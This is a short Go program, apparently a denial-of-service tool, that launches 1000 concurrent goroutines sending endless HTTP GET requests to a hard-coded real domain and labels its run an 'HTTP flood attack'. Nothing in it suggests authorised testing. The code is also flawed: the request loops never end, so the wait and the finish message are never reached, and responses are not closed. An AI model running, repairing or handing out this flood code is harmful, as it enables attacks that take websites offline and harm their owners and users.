package main

import (
	"fmt"
	"net/http"
	"sync"
	"time"
)

func sendRequest(url string, wg *sync.WaitGroup) {
	defer wg.Done()

	for {
		_, err := http.Get(url)
		if err != nil {
			fmt.Printf("Failed to send request to %s\n", url)
		} else {
			fmt.Printf("Request sent to %s\n", url)
		}
	}
}

func httpFlood(url string, seconds int, threads int) {
	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go sendRequest(url, &wg)
	}

	time.Sleep(time.Duration(seconds) * time.Second)
	wg.Wait()

	fmt.Println("HTTP flood attack finished.")
}

func main() {
	url := "https://defacto.com.tr"
	seconds := 300
	threads := 1000

	httpFlood(url, seconds, threads)
}